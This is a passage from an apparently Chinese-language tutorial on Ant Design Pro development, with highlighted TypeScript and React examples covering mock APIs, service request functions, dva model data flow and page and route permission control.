class="attr">sort</span>:<span class="number">13</span></span><br><span class="line">               &#125;</span><br><span class="line">           ]</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="keyword">return</span> res.<span class="title function_">json</span>(result);</span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">       <span class="string">&#x27;GET /api/testList&#x27;</span>:getList,</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>从上面可以看到<strong>就是简单的加了async关键字，然后加了request和response</strong></p></li></ul></li></ol><h3 id="services文件夹"><a class="markdownIt-Anchor" href="#services文件夹"></a> services文件夹</h3><ol><li><p><strong>基本概念</strong></p><p>services文件夹用于存储与后端 API 交互的服务函数。前端通过这些服务函数向后端发送请求，并处理返回的数据。定义实际的 API 调用，封装 HTTP 请求逻辑，方便在各个组件中复用和管理与后端的通信。</p><blockquote><p>注意services文件夹和mock文件夹之间的区别：</p><ul><li>services：定义实际的 API 调用，主要在生产阶段使用。</li><li>mock：定义了模拟的数据。如果设置了mock的话，services中定义的API调用会被mock拦截（API名称相同），返回mock模拟数据</li></ul></blockquote></li><li><p><strong>基本写法</strong></p><p>在services文件夹下创建ts文件，在其中定义API函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&quot;umi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get请求可以不写method字段</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">    params: &#123;</span></span><br><span class="line"><span class="params">      // query</span></span><br><span class="line"><span class="params">      /** 当前的页码 */</span></span><br><span class="line"><span class="params">      current?: <span class="built_in">number</span>;</span></span><br><span class="line"><span class="params">      /** 页面的容量 */</span></span><br><span class="line"><span class="params">      pageSize?: <span class="built_in">number</span>;</span></span><br><span class="line"><span class="params">    &#125;,</span></span><br><span class="line"><span class="params">    options?: &#123; [key: <span class="built_in">string</span>]: <span class="built_in">any</span> &#125;,</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> request&lt;<span class="variable constant_">API</span>.<span class="property">RuleList</span>&gt;(<span class="string">&#x27;/api/rule&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">      <span class="attr">params</span>: &#123;</span><br><span class="line">        ...params,</span><br><span class="line">      &#125;,</span><br><span class="line">      ...(options || &#123;&#125;),</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// post请求</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fakeAccountLogin</span>(<span class="params">params: LoginParamsType</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">request</span>(<span class="string">&#x27;/api/login/account&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: params,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>?:</code> 表示为非必须字段</p></li><li><p><code>options?: &#123; [key: string]: any &#125;</code>：表示一个可选的参数对象，键为字符串，值为任何类型</p></li><li><p><code>API.RuleList</code> 表示该请求的返回值被强制指定为 <code>API.RuleList</code> 类型，对应的类型声明可以在 <code>src\services\ant-design-pro\typings.d.ts</code> 中找到</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">RuleListItem</span> = &#123;</span><br><span class="line">  key?: <span class="built_in">number</span>;</span><br><span class="line">  disabled?: <span class="built_in">boolean</span>;</span><br><span class="line">  href?: <span class="built_in">string</span>;</span><br><span class="line">  avatar?: <span class="built_in">string</span>;</span><br><span class="line">  name?: <span class="built_in">string</span>;</span><br><span class="line">  owner?: <span class="built_in">string</span>;</span><br><span class="line">  desc?: <span class="built_in">string</span>;</span><br><span class="line">  callNo?: <span class="built_in">number</span>;</span><br><span class="line">  status?: <span class="built_in">number</span>;</span><br><span class="line">  updatedAt?: <span class="built_in">string</span>;</span><br><span class="line">  createdAt?: <span class="built_in">string</span>;</span><br><span class="line">  progress?: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">RuleList</span> = &#123;</span><br><span class="line">  data?: <span class="title class_">RuleListItem</span>[];</span><br><span class="line">  <span class="comment">/** 列表的内容总数 */</span></span><br><span class="line">  total?: <span class="built_in">number</span>;</span><br><span class="line">  success?: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><code> ...(options || &#123;&#125;)</code>  的作用是展开传入的 options 参数。如果 options 没有传递或为 null 或 undefined，则使用一个空对象 {} 作为默认值。</p></li></ul></li></ol><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><p>在 <code>test\index.tsx</code> 中写入以下内容</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ProTable</span> <span class="keyword">from</span> <span class="string">&quot;@ant-design/pro-table&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">ProColumns</span>&#125; <span class="keyword">from</span> <span class="string">&quot;@ant-design/pro-table&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;getList&#125; <span class="keyword">from</span> <span class="string">&quot;@/services/test&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">PageContainer</span>&#125; <span class="keyword">from</span> <span class="string">&quot;@ant-design/pro-layout&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Card</span>&#125; <span class="keyword">from</span> <span class="string">&quot;antd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">TestList</span> : <span class="title class_">React</span>.<span class="property">FC</span>= <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">columns</span>:<span class="title class_">ProColumns</span>[]=[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">title</span>:<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">            <span class="attr">dataIndex</span>:<span class="string">&#x27;id&#x27;</span></span><br><span class="line">        &#125;,&#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">            <span class="attr">dataIndex</span>: <span class="string">&#x27;name&#x27;</span></span><br><span class="line">        &#125;,&#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;sort&#x27;</span>,</span><br><span class="line">            <span class="attr">dataIndex</span>: <span class="string">&#x27;sort&#x27;</span></span><br><span class="line">        &#125;]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;<span class="name">PageContainer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">           <span class="tag">&lt;<span class="name">Card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">               <span class="tag">&lt;<span class="name">ProTable</span> <span class="attr">columns</span>=<span class="string">&#123;columns&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                         <span class="attr">request</span>=<span class="string">&#123;async</span> (<span class="attr">params</span>) =&gt;</span>&#123;</span></span><br><span class="line"><span class="language-xml">                             let result = await getList();</span></span><br><span class="line"><span class="language-xml">                             return result;</span></span><br><span class="line"><span class="language-xml">                         &#125;&#125;/&gt;</span></span><br><span class="line"><span class="language-xml">           <span class="tag">&lt;/<span class="name">Card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;/<span class="name">PageContainer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">TestList</span>;</span><br></pre></td></tr></table></figure><h2 id="model数据流管理"><a class="markdownIt-Anchor" href="#model数据流管理"></a> model数据流管理</h2><p>这里主要参考 <a href="https://dvajs.com/guide/introduce-class.html#react">DvaJS入门课 | Model</a></p><ol><li><p><strong>基本概念</strong></p><p>中后台场景下，绝大多数页面的数据流转都是在当前页完成，在页面挂载的时候请求后端接口获取并消费，这种场景下并不需要复杂的数据流方案。但是也存在需要全局共享的数据，如用户的角色权限信息或者其他一些页面间共享的数据。那么<strong>怎么才能缓存并支持在多个页面直接去共享这部分数据呢</strong>。</p><p>为了实现在多个页面中的数据共享，以及一些业务可能需要的简易的数据流管理的场景，model 是用于管理应用状态的一个重要概念。Ant Design Pro 默认使用 dva 进行状态管理，而 model 是 dva 的核心部分之一。</p><p><strong>model其实就是对数据的处理过程又进行了一次封装</strong>，每个 model 负责管理一种特定类型的数据（按照功能业务逻辑进行花粉）。例如，你可以有一个用户数据的 model，一个商品数据的 model，一个订单数据的 model 等等。model 不仅仅是存储数据，还包含了如何处理这些数据的业务逻辑。它包括同步操作（reducers）和异步操作（effects）。</p><blockquote><p>一般来说在AntD中数据请求过程是这样的：</p><p>1.UI 组件交互操作；</p><p>2.调用 model 的 effect；</p><p>3.调用统一管理的 service 请求函数；</p><p>4.使用封装的 request.ts 发送请求；</p><p>5.获取服务端返回；</p><p>6.然后调用 reducer 改变 state；</p><p>7.更新 model。</p><p><strong>View-&gt;model-&gt;Service-&gt;后端（或Mock）</strong></p></blockquote></li><li><p><strong>数据流图</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/hUFIivoOFjVmwNXjjfPE.png" alt="img" /></p><p>核心概念：</p><p><strong>1）state</strong>：一个对象，保存整个应用状态。是储存数据的地方，收到 Action 以后会更新数据。</p><p><strong>2）View</strong>：React 组件构成的视图层。从 State 取数据后，渲染成 HTML 代码。只要 State 有变化，View 就会自动更新</p><p><strong>3）Action</strong>：用来描述 UI 层事件的一个对象。</p><p><strong>4）connect</strong>：一个函数，绑定 State 到 View。</p><p><strong>5）dispatch</strong>：一个函数方法，用来将 Action 发送给 State。</p></li><li><p><strong>使用Model</strong></p><ul><li><strong>state</strong> ：保存应用状态。每个 model 都有自己独立的 state，用于存储与该 model 相关的数据。状态可以是任何类型的值，包括对象、数组等。在 Page 中连接的时候使用到。</li><li><strong>reducers</strong>：处理同步操作的纯函数，接收当前的 state 和 action，返回新的 state。它们描述了如何根据 action 来修改 state。</li><li><strong>effects</strong>：用于处理异步操作的函数，通常用于发起网络请求、执行异步逻辑等。effects 通常使用 redux-saga 来实现，effects 可以调用其他的 reducers 来更新 state。</li><li><strong>subscriptions</strong> ：用于订阅数据源的机制，可以在应用启动时进行一些数据初始化操作或监听路由变化等。例如当访问某个页面的时候设置自动获取某些数据。</li><li><strong>namespace</strong>： model 的命名空间，用于区分不同 model 的作用域。在 dispatch action 时，需要加上 namespace 以便明确指向哪个 model。</li></ul></li><li><p><strong>示例</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123;<span class="title class_">Effect</span>&#125; <span class="keyword">from</span> <span class="string">&quot;umi&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Reducer</span>&#125; <span class="keyword">from</span> <span class="string">&quot;umi&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;getTableValue, selectTableValue&#125; <span class="keyword">from</span> <span class="string">&quot;@/pages/table/service&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 设置类型</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">TableValue</span>=&#123;</span><br><span class="line">    key?: <span class="title class_">String</span>;</span><br><span class="line">    name?:<span class="title class_">String</span>;</span><br><span class="line">    age?:<span class="title class_">Number</span>;</span><br><span class="line">    address?: <span class="title class_">String</span>;</span><br><span class="line">    time?:<span class="title class_">String</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> allValue = &#123;</span><br><span class="line">    tableValue?:<span class="title class_">TableValue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Model类型定义</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">TableModelType</span> = &#123;</span><br><span class="line">    <span class="attr">namespace</span>:<span class="string">&#x27;tableDemo&#x27;</span>;</span><br><span class="line">    <span class="attr">state</span>:allValue;</span><br><span class="line">    <span class="attr">effects</span>:&#123;</span><br><span class="line">        <span class="attr">getValue</span>:<span class="title class_">Effect</span>;</span><br><span class="line">        <span class="attr">selectValue</span>:<span class="title class_">Effect</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attr">reducers</span>:&#123;</span><br><span class="line">        <span class="attr">saveValue</span>:<span class="title class_">Reducer</span>&lt;allValue&gt;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Model的实现</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">TableModel</span>:<span class="title class_">TableModelType</span>=&#123;</span><br><span class="line">    <span class="comment">//命名空间</span></span><br><span class="line">    <span class="attr">namespace</span>: <span class="string">&quot;tableDemo&quot;</span>,</span><br><span class="line">    <span class="comment">//设置state</span></span><br><span class="line">    <span class="attr">state</span>: &#123;</span><br><span class="line">        <span class="attr">tableValue</span>:&#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//提供给view调用的接口</span></span><br><span class="line">    <span class="attr">effects</span>: &#123;</span><br><span class="line">        *<span class="title function_">getValue</span>(<span class="params">_,&#123;call,put&#125;</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> res = <span class="keyword">yield</span> <span class="title function_">call</span>(getTableValue);</span><br><span class="line">            <span class="keyword">yield</span> <span class="title function_">put</span>(&#123;</span><br><span class="line">                <span class="attr">type</span>:<span class="string">&#x27;saveValue&#x27;</span>,</span><br><span class="line">                <span class="attr">payload</span>:res</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        *<span class="title function_">selectValue</span>(<span class="params">&#123;payload&#125;,&#123;call,put&#125;</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;model:&quot;</span>+payload)</span><br><span class="line">            <span class="keyword">const</span> res = <span class="keyword">yield</span> <span class="title function_">call</span>(selectTableValue,payload);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">            <span class="keyword">yield</span> <span class="title function_">put</span>(&#123;</span><br><span class="line">                <span class="attr">type</span>:<span class="string">&#x27;saveValue&#x27;</span>,</span><br><span class="line">                <span class="attr">payload</span>:res</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//提供给effects通信put的接口</span></span><br><span class="line">    <span class="attr">reducers</span>: &#123;</span><br><span class="line">        <span class="title function_">saveValue</span>(<span class="params">date,action</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>&#123;</span><br><span class="line">                ...date,</span><br><span class="line">                <span class="attr">tableValue</span>: action.<span class="property">payload</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">TableModel</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>export type</strong>：定义数据类型（ <code>?:</code> 表示为非必须字段）</li><li>2.Model类型定义：通过 TypeScript 类型定义，明确描述模型的结构，包括命名空间、状态、effects 和 reducers。这样可以在编写和维护代码时提供类型检查和自动补全功能，提高代码的可靠性和可读性</li><li><strong>其中effects内我们可以看到有一个带*号的方法</strong>，表示这个方法是提供给Page调用的</li><li><strong>put、call、select方法</strong> 是提供通信的，例如yield put（）是对reducers中的方法调用。yield call是去访问service中的方法。</li></ul></li></ol><h2 id="权限设置"><a class="markdownIt-Anchor" href="#权限设置"></a> 权限设置</h2><ol><li><p><strong>全局初始数据</strong></p><p>几乎大部分中台项目都有一个需求，就是在整个应用加载前请求用户信息或者一些全局依赖的基础数据。这些信息通常会用于 Layout 上的基础信息（通常是用户信息），权限初始化，以及很多页面都可能会用到的基础数据。</p><p>如何使用全局初始数据：</p><p>在<strong>运行时配置文件 <code>src/app.ts</code></strong> 中添加运行时配置 <code>getInitialState</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInitialState</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">userName</span>: <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法返回的数据最后会被默认注入到一个 namespace 为 <code>@@initialState</code> 的 model 中。后续可以通过 <code>useModel</code> 这个 hook来消费它</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; useModel &#125; <span class="keyword">from</span> <span class="string">&#x27;umi&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Spin</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; initialState, loading, refresh, setInitialState &#125; = <span class="title function_">useModel</span>(<span class="string">&#x27;@@initialState&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (loading) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Spin</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;initialState.userName&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>初始化</strong></p><p>在<strong>权限定义文件 <code>src\access.ts</code></strong> 下定义用户拥有的权限，在该文件中 <code>export default</code> 一个函数，定义用户拥有的权限，以下是示例定义：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/access.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> (<span class="params">initialState</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">canReadFoo</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">canUpdateFoo</span>: <span class="function">() =&gt;</span> <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">canDeleteFoo</span>: <span class="function">(<span class="params">data</span>) =&gt;</span> data?.<span class="property">status</span> &lt; <span class="number">1</span>, <span class="comment">// 按业务需求自己任意定义鉴权函数</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该文件需要返回一个 function，返回的 function 会在应用初始化阶段被执行，执行后返回的对象将会被作为用户所有权限的定义。对象的每个 key 对应一个 boolean 值，只有 true 和 false，代表用户是否有该权限。</p></li><li><p><strong>页面内的权限控制（即设置页面中的部分内容对用户不可见）</strong></p><p>使用 <code>useAccess</code> hook 来获取权限定义</p><p>也可以使用 <code>Access</code> 组件用于页面的元素显示和隐藏的控制。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useAccess, <span class="title class_">Access</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;umi&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">PageA</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; foo &#125; = props;</span><br><span class="line">  <span class="keyword">const</span> access = <span class="title function_">useAccess</span>(); <span class="comment">// access 实例的成员: canReadFoo, canUpdateFoo, canDeleteFoo</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (access.<span class="property">canReadFoo</span>) &#123;</span><br><span class="line">    <span class="comment">// 任意操作</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Access</span> <span class="attr">accessible</span>=<span class="string">&#123;access.canReadFoo&#125;</span> <span class="attr">fallback</span>=<span class="string">&#123;</span>&lt;<span class="attr">div</span>&gt;</span>Can not read foo content.<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        Foo content.</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Access</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Access</span> <span class="attr">accessible</span>=<span class="string">&#123;access.canUpdateFoo()&#125;</span> <span class="attr">fallback</span>=<span class="string">&#123;</span>&lt;<span class="attr">div</span>&gt;</span>Can not update foo.<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        Update foo.</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Access</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Access</span> <span class="attr">accessible</span>=<span class="string">&#123;access.canDeleteFoo(foo)&#125;</span> <span class="attr">fallback</span>=<span class="string">&#123;</span>&lt;<span class="attr">div</span>&gt;</span>Can not delete foo.<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        Delete foo.</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Access</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>路由和菜单的权限控制</strong></p><p>在路由配置文件 <code>config.ts</code> 中想要添加访问控制的路由上加上 <code>access</code> 字段即可</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/admin&#x27;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;admin&#x27;</span>,   </span><br><span class="line">  <span class="attr">icon</span>: <span class="string">&#x27;crown&#x27;</span>,</span><br><span class="line">  <span class="comment">// 调用 src/access.ts 中返回的 normalRouteFilter 进行鉴权</span></span><br><span class="line">  <span class="attr">access</span>: <span class="string">&#x27;normalRouteFilter&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应鉴权函数(比如 <code>adminRouteFilter</code>)在接收路由作为参数后返回值为 <code>false</code>，该条路由将会被禁用，并且从左侧 layout 菜单中移除，如果直接从 URL 访问对应路由，将看到一个 403 页面。</p></li></ol><h1 id="页面开发实例"><a class="markdownIt-Anchor" href="#页面开发实例"></a> 页面开发实例</h1><h2 id="创建mock"><a class="markdownIt-Anchor" href="#创建mock"></a> 创建mock</h2><p>在 mock 文件夹下新建 <code> mock\logindata.mock.ts</code> 文件添加新定义的API所返回的模拟数据json形式，定义 <code>GET /api/logindata</code> 。实际情况下几乎所有的请求都应该设置为异步，但在某些特定情况下，例如需要确保顺序执行的任务，可以根据需求使用同步请求。然而，这种情况非常少见，大多数前端应用都应使用异步请求。</p><p>所以我们在这里创建的是异步请求，并且模拟异步请求延迟，请求API后5秒返回数据</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 